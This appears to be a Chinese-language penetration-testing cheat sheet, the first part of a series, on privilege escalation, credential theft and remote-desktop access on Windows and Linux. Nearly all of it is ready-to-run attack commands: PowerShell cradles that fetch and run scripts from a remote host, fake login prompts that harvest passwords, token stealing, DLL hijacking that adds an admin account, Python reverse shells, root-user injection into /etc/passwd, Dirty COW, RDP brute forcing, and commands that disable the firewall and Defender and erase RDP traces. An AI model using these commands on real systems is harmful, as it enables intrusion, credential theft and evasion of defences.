>msxls.exe http://192.168.0.107/shellcode.xml http://192.168.0.107/shellcode.xml
Empire生成shellcode贴到脚本中EncodedPayload位置

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1ykoQPj7riaaWalXMQQ2ticyvTV8Kd3xWXTrNLfqibicDF7ReUOIibqibomETQ/640?wx_fmt=png)

#### CPL  

```
Kali监听

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yWjHicy0ufdb1YpXzOa8qaNlhOsgVJ4fSGfpYt6c2uUEBln0USU4SDJQ/640?wx_fmt=png)

```
编译成DLL


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1y20BQkeWfAQZTEjobFOIHX2UJYz5kiaK8qowjicZcia8X7eicbWYXaXBWug/640?wx_fmt=png)

```
Control执行
>control C:\\Users\\Administrator.DC\\Desktop\\VC6.0green\\MyProjects\\dll\\Debug\\dll.dll

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1y0OcWz0aPeHp7WtuCriaUe1P7stFSNjB7GZx5KDkJ8cDiaGP7huFZVgibA/640?wx_fmt=png)

```
或将DLL后缀改为cpl，双击执行，或rundll32执行


```

```
\>rundll32.exe shell32.dll,Control\_RunDLL C:\\Users\\Administrator.DC\\Desktop\\VC6.0green\\MyProjects\\dll\\Debug\\dll.dll

```

```
Runas


```

```
#use exploit/windows/local/ask

```

### 令牌窃取

#### MSF

```
Meterpreter>use incognito
Meterpreter>list\_tokens -u
Meterpreter>impersonate\_token name\\\\administrator
&
Meterpreter>ps
Meterpreter>steal\_token pid

```

#### Cobalt strike

```
beacon> steal\_token 1234 窃取令牌
beacon> rev2self 恢复令牌
Windows
https://gitee.com/RichChigga/incognito2

```

```
密码窃取


```

#### 伪造锁屏

```
https://github.com/Pickfordmatt/SharpLocker/releases

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yFownXdsZumyvopQDOZv3Z7YFndFKoo9yicuV8rY5SBH4yge29fEPG1w/640?wx_fmt=png)

```
https://github.com/bitsadmin/fakelogonscreen/releases

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yqJOJPJdmS1uQZLTez8q23pRicbZjMxnNNyURricB9ptxpYT1G5YWcs4w/640?wx_fmt=png)

```
记录的密码保存在


```

```
%LOCALAPPDATA%\\Microsoft\\user.db

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1ynXBf0l29TtQY3TNkicmF6hZgwA5zibica1HgxdQibnaBVKEbRdvnSxx8ibg/640?wx_fmt=png)

#### 伪造认证框

```
CredsLeaker
https://github.com/Dviros/CredsLeaker
将cl\_reader.php，config.php，config.cl上传到web服务器
修改CredsLeaker.ps1、run.bat中URL参数

```

```
输入正确密码后会自动结束，否则除非结束powershell进程才可结束
获取到正确密码后会在目录下生成creds.txt保存密码信息


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yPQNx6kjawVfiajvmzZxBa7sd2wnDdicUka3zRJdibfyH1odiavJevVDGdA/640?wx_fmt=png)

##### LoginPrompt

```
\>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-LoginPrompt.ps1');invoke-LoginPrompt"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yS5gjWiaYBYnSZJia1Z33MltesX1sMZ87libreZfuOQ1Q6SSFQa6vNmfJw/640?wx_fmt=png)

```
除非结束进程，否则只能输对密码才能关闭对话框。

收到正确密码会返回结果

```

##### Nishang-Invoke-CredentialsPhish

```
\>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.108/ps/nishang/Gather/Invoke-CredentialsPhish.ps1'); Invoke-CredentialsPhish"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1y0l3zs9wpTgfO8rvJ17u7FCKyOD6JLjP9pa5eq4oW6fS0E6ias8PZI5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1y4lCqqQK1ibQ3bPBEkr6cpGxeHkkpPCAJvpUy3VU7nJ0EyeGicxLtFicbw/640?wx_fmt=png)

### **RottenPotato**

```
https://github.com/foxglovesec/RottenPotato Meterpreter>use incognito
Meterpreter>list\_tokens -u
Meterpreter>upload /root/Desktop/rottenpotato.exe
Meterpreter>execute -HC -f rottenpotato.exe
Meterpreter>impersonate\_token "NT AUTHORITY\\\\SYSTEM

```

### **PowerUp**

```
检测有漏洞的服务

```

```
\>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Invoke-AllChecks"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yUrogticx6zxtr4IwafPtdZwBryibYSHQPP1SibkYnKhNL0qvkPu8AQ9OA/640?wx_fmt=png)

```
\>icacls C:\\Windows\\system32\\\\wlbsctrl.dll 查看文件权限，F为完全控制，M修改

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1y3onYXLPl0n2RF1iaGPcm5LicZDCPbwEL2ibmVN9TBtLSmogf2HISeXzuQ/640?wx_fmt=png)

```
在AbuseFunction中会显示利用语句。

```

```
\>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-HijackDll -OutputFile 'C:\\Windows\\system32\\\\wlbsctrl.dll' -Command 'net user admin pass@Qwe1 /add&net localgroup administrators admin /add'"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yYfZz6pLKPEMNuXQE3WWeuIRibx9iaGrlISlZEjDHr9cibWnaib5zAYcwUQ/640?wx_fmt=png)

```
重启电脑后会新增用户admin


```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yKrCibyPgfz6xk2t7eV3WrzdUWEM1hmAuT2ArXMrO5kOCzqxUupFwrfw/640?wx_fmt=png)

```
查找可能劫持的进程


```

```
查找可能劫持的进程
>Find-ProcessDLLHijack
查找环境变量中当前用户可修改的目录
>Find-PathDLLHijack
查找存在注册表中自动登录用户的平局
>Get-RegistryAutoLogon
查询trusted\_service\_path
>Get-ServiceUnquoted
查询当前用户可修改的注册表开机启动项
>Get-ModifiableRegistryAutoRun
查询当前用户可修改的计划任务项
>Get-ModifiableScheduledTaskFile
查询系统中所有web.config文件中的明文密码
>Get-WebConfig

```

```
Powerup-AlwaysInstallElevated

```

```
\>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Get-RegAlwaysInstallElevated"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yQUOVvTqzV65woLIYYcgpicP6cSpvicVU5vaicIo0m5u2MUbQAEWXuHy2A/640?wx_fmt=png)

```
\>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-UserAddMSI"

```

`普通用户执行安装`

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1ygs4xuKu0oiaO1cxibmjGAMst0QcwlCowcnJSGDicIfMR2ibuYodhe8nNqQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1ytY0OeWnTZ3vBibgBEUqEjj2ukTHUESYuTDcTBc9nKViamwficYBUiaOaVw/640?wx_fmt=png)

### AlwaysInstallElevated 提权

```
\>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
为1 检测是否永远以高权限启动安装
#HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
新建DWORD32 DisableMSI=0
#msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi
#upload /root/add.msi c:\\\\1.msi
>msiexec /quiet /qn /i c:\\1.msi
MSF
#use exploit/windows/local/always\_install\_elevated
#set session 1

```

### Trusted Service Paths

```
\>wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\\windows\\\\" |findstr /i /v """ 列出没有用引  号包含的服务
#use exploit/windows/local/trusted\_service\_path
#set session 1

```

### Vulnerable Services

```
#use exploit/windows/local/service\_permissions
#set session 1

```

```
Sudo提权


```

```
/home/user/.sudo\_as\_admin\_successful
>sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
>sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
>sudo strace –o /dev/null /bin/bash
>sudo nmap –interactive nmap>!sh
>echo "os.execute('/bin.sh')">/tmp/1.nse
>sudo nmap –script=/tmp/shell.nse 
>sudo more/less/man /etc/rsyslog.conf
>sudo git help status 
>!/bin/bash
>sudo ftp
>!/bin/bash
>sudo vim -c '!sh'
>sudo find /bin/ -name ls -exec /bin/bash ;
>sudo awk 'BEGIN {system("/bin/sh")}'

```

### Linux 计划任务

```
\>for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done 列举所有用户的crontab
$cat /etc/crontab
$echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' >test.sh
$echo "" > "--checkpoint-action=exec=sh test.sh"
$echo "" > --checkpoint=1
或编辑可写的计划任务文件
#!/usr/bin/python
import os,subprocess,socket
s=socket.socekt(socket.AF\_INET,socket.SOCK\_STREAM)
s.connect(("192.168.0.107","5555"))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(\["/bin/sh","-i"\])

```

### Linux SUID 提权

```
查找有root权限的SUID文件
$find / -perm -u=s -type f 2>/dev/null
$find / -user root -perm -4000 -print 2>/dev/null
$find / -user root -perm -4000 -exec ls -ldb {} \\;

```

```
Find


```

```
$touch xxx
$/usr/bin/find xxx –exec whoami \\;
$/usr/bin/find xxx –exec python -c 'import   socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'  \\;
&
>find xxx -exec netcat -lvp 12138 -e /bin/sh \\; 然后攻击机主动连接

```

#### NMAP

```
\# 进入nmap的交互模式
>nmap --interactive 
>!sh

```

#### VIM

```
\>vim.tiny /etc/shadow
&
>vim.tiny
# 按ESC
:set shell=/bin/sh
:shell

```

#### BASH

```
\>bash –p
####More/Less/Man >less /etc/passwd !/bin/sh >more /etc/passwd !/bin/bash >man passwd !/bin/bash

```

```
CP/MV


```

```
覆盖shadow文件

```

### Linux /etc/passwd 提权

```
$ls –lh /etc/passwd 若是任何用户可读写
$perl -le 'print crypt("password@123","addedsalt")' 生成密码
$echo "test:advwtv/9yU5yQ:0:0:User\_like\_root:/root:/bin/bash" >>/etc/passwd
一条命令添加root用户
#useradd -p \`openssl passwd -1 -salt 'user' 123qwe\` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus
用户名venus 密码123qwe
#useradd newuser;echo "newuser:password"|chpasswd
>echo "admin:x:0:0::/:/bin/sh" >> /etc/passwd
>passwd admin修改密码

```

Linux 脏牛提权  

```
https://github.com/FireFart/dirtycow
$gcc -pthread dirty.c -o dirty –lcrypt
$./dirty passwd 
生成账户密码
https://github.com/gbonacini/CVE-2016-5195
$make
$./dcow -s

```

**RDP&Fireawall**

### **爆破**

```
Hydra爆破RDP
>hydra -l admin -P /root/Desktop/passwords -S 192.168.0.0 rdp
&
Nlbrute

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yhHaDgF6ticyicNSyuia9lictOqNT3D6M8SKWA6fibcVnEsSLa9HEHGzdN7Q/640?wx_fmt=png)

### 注册表开启

```
查询系统是否允许3389远程连接：
>REG QUERY "HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections
1表示关闭，0表示开启
查看远程连接的端口：
>REG QUERY "HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber
本机开启3389远程连接的方法
通过cmd
>REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f
>REG ADD "HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber /t REG\_DWORD /d 0x00000d3d /f
通过reg文件
内容如下：
Windows Registry Editor Version 5.00
\[HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\]
"fDenyTSConnections"=dword:00000000
\[HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\]
"PortNumber"=dword:00000d3d
导入注册表：
regedit /s a.reg

```

### NETSH 启动服务

```
\>netsh firewall set service remoteadmin enable 
>netsh firewall set service remotedesktop enable
>netsh firewall set opmode disable 关闭防火墙

```

### 注入点开启

```
.asp?id=100;exec master.dbo.xp\_regwrite 'HKEY\_LOCAL\_MACHINE','SYSTEM\\CurrentControlSet\\Control\\Terminal Server','fDenyTSConnections','REG\_DWORD',0;--
注：
修改连接端口重启后生效

```

### MSF 开启

```
#run post/windows/manage/enable\_rdp

```

### Wmic 开启

```
\>wmic /node:192.168.1.2 /USER:administrator PATH win32\_terminalservicesetting WHERE (\_\_Class!="") CALL SetAllowTSConnections 1

```

```
防火墙


```

```
允许进站
如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:
>netsh advfirewall firewall add rule  protocol=TCP dir=in localport=3389 action=allow
>netsh firewall set portopening TCP 3389 ENABLE
防火墙关闭
>netsh firewall set opmode mode=disable
>netsh advfirewall show allprofiles查看状态
>netsh advfirewall set allprofiles state off 
>sc stop windefend
>sc delete windefend
PS> Set-MpPreference -DisableRealtimeMonitoring 1
PS> Set-MpPreference -Disablearchivescanning $true

```

### 多用户登录

```
Mimikatz设置允许多用户登录
>privilege::debug
>ts::multirdp
rdpwrap
https://github.com/stascorp/rdpwrap
>RDPWInst.exe -i is

```

### RDP 连接记录

```
https://github.com/3gstudent/List-RDP-Connections-History
查看本机用户连接RDP的记录

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7dJfmevE1MuicKGpJFxqmM1yLQ5fUKQJ1o6vtDP2yAwJdamjBBESOxr9WNZicIic7kI3VRaCcHZ6NH9w/640?wx_fmt=png)

```
\>Psloggedon.exe username

```

### 删除痕迹

```
@echo off
@reg delete "HKEY\_CURRENT\_USER\\Software\\Microsoft\\Terminal Server Client\\Default" /va /f
@del "%USERPROFILE%\\My Documents\\Default.rdp" /a
@exit

```

```
                （上篇完）

```